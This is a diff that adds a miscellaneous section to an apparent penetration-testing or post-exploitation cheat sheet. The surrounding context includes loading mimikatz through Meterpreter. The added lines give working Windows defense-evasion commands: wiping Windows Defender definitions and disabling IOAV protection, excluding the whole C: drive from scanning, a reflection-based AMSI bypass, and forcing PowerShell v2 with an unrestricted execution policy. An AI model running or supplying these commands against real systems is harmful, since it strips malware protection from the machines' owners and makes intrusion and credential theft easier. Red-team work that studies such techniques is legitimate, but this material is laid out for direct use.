@@ -109,4 +109,15 @@
 # Meterpreter - load mimikatz
 	load kiwi
 
+~~~~~~~~~ MISCELLANEOUS ~~~~~~~~~
+
+# Turn Off Windows Defender
+	"c:\program files\windows defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true
+# Set Windows Defender Exclusion Path
+	powershell -Command "Add-MpPreference -ExclusionPath "c:\"
+# Disable AMSI to Disable Hueristic Malicious Powershell Code Detection
+	powershell -Command "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+# Unrestrict Powershell Execution Policy
+	powershell.exe -Version 2 -Command "& {Set-ExecutionPolicy -ExecutionPolicy Unrestricted}"
+
 
